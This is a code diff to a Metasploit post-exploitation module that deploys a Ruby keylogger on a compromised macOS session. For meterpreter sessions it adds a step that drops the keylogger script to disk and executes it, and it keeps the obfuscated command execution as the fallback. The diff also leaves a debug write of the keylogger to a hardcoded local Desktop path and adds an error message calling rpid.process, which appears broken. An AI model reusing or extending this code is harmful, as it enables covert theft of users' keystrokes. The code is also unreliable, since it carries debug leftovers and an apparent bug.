@@ -74,13 +74,26 @@ class Metasploit3 < Msf::Post
       :port => self.port
     }
 
-    rpid = cmd_exec(obfuscated_ruby_cmd(ruby_code(opts)))
+    File.write('/Users/joe/Desktop/keylog.rb', ruby_code(opts))
+
+    rpid = if session.type =~ /meterpreter/i
+      path = '/Users/joe/Desktop/keylog2.rb'
+      print_status "Dropping ruby file..."
+      write_file(path, ruby_code(opts))
+      print_status "Running ruby file..."
+      process = session.sys.process.execute("/usr/bin/ruby #{path}", '')
+      # Rex.sleep(3)
+      process.pid
+      # cmd_exec("/bin/sh", ["-c", "ruby #{path}"])
+    else
+      cmd_exec(obfuscated_ruby_cmd(ruby_code(opts)))
+    end
 
     if rpid.to_i.present? and not rpid.to_i.zero?
       print_status "Ruby process executing with pid #{rpid.to_i}"
       rpid.to_i
     else
-      fail_with(Exploit::Failure::Unknown, "Ruby keylogger command failed with error #{rpid}")
+      fail_with(Exploit::Failure::Unknown, "Ruby keylogger command failed with error #{rpid.process}")
     end
   end
 
